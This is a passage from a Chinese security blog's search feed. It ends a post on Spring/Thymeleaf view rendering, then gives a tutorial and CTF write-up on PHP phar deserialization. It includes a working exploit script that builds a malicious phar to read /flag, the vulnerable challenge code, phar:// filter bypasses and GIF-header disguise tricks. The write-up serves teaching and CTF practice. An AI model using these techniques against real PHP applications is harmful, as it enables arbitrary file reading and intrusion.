class="token punctuation">,</span> locale<span class="token punctuation">,</span> requestedMediaTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">View</span> bestView <span class="token operator">=</span> <span class="token function">getBestView</span><span class="token punctuation">(</span>candidateViews<span class="token punctuation">,</span> requestedMediaTypes<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bestView <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> bestView<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre><p>这里主要就是两个方法 <code>getCandidateViews</code> 和 <code>getBestView</code></p><p>在 <code>getCandidateViews</code> 方法中，遍历所有的 <code>ViewResolver</code>，将解析成功的视图放到视图候选列表中</p><p><img src="/posts/8860d38d/Pasted-image-20220920105926.png" alt="Pasted-image-20220920105926.png"></p><p>然后通过 <code>getBestView</code> 方法从候选列表中拿到最适配的视图，该方法会优先匹配存在重定向操作的视图，如果不存在重定向操作的视图则根据请求头中的 <code>Accept</code> 字段的值与 <code>candidateViews</code> 的相关顺序，并判断是否兼容来返回最适配的 <code>View</code></p><p><img src="/posts/8860d38d/Pasted-image-20220920110323.png" alt="Pasted-image-20220920110323.png"></p><h2 id="渲染视图"><a href="#渲染视图" class="headerlink" title="渲染视图"></a>渲染视图</h2><p>在 <code>DispatcherServlet#render</code> 中获取到视图后会调用视图对应的 <code>render</code> 方法</p><p>这里会调用 <code>ThymeleafView#render</code> 方法，最终会调用到 <code>ThymeleafView#renderFragment</code> 方法</p><p>在 <code>renderFragment</code> 方法中会将之前获得的视图名称作为模板名，获取到模板渲染引擎后，解析模板中的表达式，最后返回到浏览器中</p><p>关键代码如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">String</span> viewTemplateName <span class="token operator">=</span> <span class="token function">getTemplateName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">ISpringTemplateEngine</span> viewTemplateEngine <span class="token operator">=</span> <span class="token function">getTemplateEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">IStandardExpressionParser</span> parser <span class="token operator">=</span> <span class="token class-name">StandardExpressions</span><span class="token punctuation">.</span><span class="token function">getExpressionParser</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">FragmentExpression</span> fragmentExpression<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// By parsing it as a standard expression, we might profit from the expression cache</span>    fragmentExpression <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">FragmentExpression</span><span class="token punctuation">)</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"~&#123;"</span> <span class="token operator">+</span> viewTemplateName <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">TemplateProcessingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Invalid template name specification: '"</span> <span class="token operator">+</span> viewTemplateName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar 反序列化</title>
      <link href="/posts/c5577d2.html"/>
      <url>/posts/c5577d2.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 Blackhat2018，来自 Secarma 的安全研究员 Sam Thomas 讲述了一种攻击 PHP 应用的新方式，利用这种方法可以在不使用 unserialize()函数的情况下触发 PHP 反序列化漏洞</p><p>在使用 phar:&#x2F;&#x2F;协议读取文件时，文件会被解析成 phar( <a href="http://php.net/manual/zh/intro.phar.php">http://php.net/manual/zh/intro.phar.php</a> )解析过程中会触发 <code>php_var_unserialize()</code> 函数，造成反序列化</p><p>phar 反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code> 等）参数可控的情况下，配合 <code>phar://</code> 伪协议，可以不依赖 <code>unserialize()</code> 直接进行反序列化操作</p><h1 id="phar-文件结构"><a href="#phar-文件结构" class="headerlink" title="phar 文件结构"></a>phar 文件结构</h1><p>phar 文件主要包含三至四个部分</p><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以 <code>__HALT_COMPILER();?&gt;</code> 来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件</p><h2 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h2><p>phar 文件中被压缩的文件的一些信息，其中 <code>Meta-data</code> 部分的信息会以反序列化的形式储存，这里就是漏洞利用的关键点</p><h2 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h2><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><h2 id="a-signature-for-verifying-Phar-integrity"><a href="#a-signature-for-verifying-Phar-integrity" class="headerlink" title="a signature for verifying Phar integrity"></a>a signature for verifying Phar integrity</h2><p>验证 phar 完整性的签名（仅限 Phar 文件格式）放在文件末尾，该部分可选</p><p><img src="/posts/c5577d2/Pasted-image-20220919232635.png" alt="Pasted-image-20220919232635.png"></p><h1 id="生成-phar-文件"><a href="#生成-phar-文件" class="headerlink" title="生成 phar 文件"></a>生成 phar 文件</h1><p>首先要在 php.ini 中设置 <code>phar.readonly=Off</code>，否在无法生成 phar 文件</p><p>一般生成 phar 文件的方法如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//签名自动计算</span><span class="token delimiter important">?></span></span></code></pre><p>生成的 phar 文件结构，可以看到 Meta-data 的内容是以反序列的形式储存的</p><p><img src="/posts/c5577d2/Pasted-image-20220919234800.png" alt="Pasted-image-20220919234800.png"></p><h1 id="例题：2022-第五空间-BaliYun-图床"><a href="#例题：2022-第五空间-BaliYun-图床" class="headerlink" title="例题：2022 第五空间 BaliYun 图床"></a>例题：2022 第五空间 BaliYun 图床</h1><p>存在 <a href="http://www.zip/">www.zip</a> 备份文件，下载后审计</p><p>关键代码如下</p><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Valid_ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Valid_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Image already exsists"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ext</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Valid_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Only Image Can Be Uploaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Upload succsess!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">check_img</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$img_name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">img_name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">img_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">img_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Image exsists"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Image not exsists"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>截取自 index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$down</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">check_img</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$down</span><span class="token operator">-></span><span class="token function">img_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$up</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$up</span><span class="token operator">-></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>可以看到 upload 类的 <code>__wakeup</code> 方法中可以任意读取文件，另外在 check_img 类的 <code>img_check</code> 方法中调用了 <code>file_exists</code> 方法，且 <code>this-&gt;img_name</code> 可控，所有可以通过 <code>phar://</code> 伪协议触发 phar 反序列化</p><h2 id="生成恶意-phar-文件"><a href="#生成恶意-phar-文件" class="headerlink" title="生成恶意 phar 文件"></a>生成恶意 phar 文件</h2><p>通过 <code>?img_name=/flag</code> 已经确定 flag 位于根目录下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Valid_ext</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$up</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$up</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"base.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$up</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"text.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>修改生成的 phar 文件后缀为 png 后上传，通过 <code>?img_name=phar://upload/base.png</code> 即可读取到 flag</p><p><img src="/posts/c5577d2/Pasted-image-20220920000514.png" alt="Pasted-image-20220920000514.png"></p><h1 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h1><h2 id="过滤-phar-x2F-x2F-协议"><a href="#过滤-phar-x2F-x2F-协议" class="headerlink" title="过滤 phar:&#x2F;&#x2F;协议"></a>过滤 phar:&#x2F;&#x2F;协议</h2><ul><li><p><code>compress.bzip2://phar://</code></p></li><li><p><code>compress.zlib://phar:///</code></p></li><li><p><code>php://filter/resource=phar://</code></p></li></ul><h2 id="伪装成其他文件类型"><a href="#伪装成其他文件类型" class="headerlink" title="伪装成其他文件类型"></a>伪装成其他文件类型</h2><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p><p>添加gif文件头</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a &lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//签名自动计算</span><span class="token delimiter important">?></span></span></code></pre><p><img src="/posts/c5577d2/Pasted-image-20220920000855.png" alt="Pasted-image-20220920000855.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/3692">https://xz.aliyun.com/t/3692</a></p><p><a href="https://cloud.tencent.com/developer/article/1378892">https://cloud.tencent.com/developer/article/1378892</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100995404">https://blog.csdn.net/qq_42181428/article/details/100995404</a></p><p><a href="https://paper.seebug.org/988/">https://paper.seebug.org/988/</a></p><p><a href="https://www.php.net/manual/en/phar.fileformat.phar.php">https://www.php.net/manual/en/phar.fileformat.phar.php</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
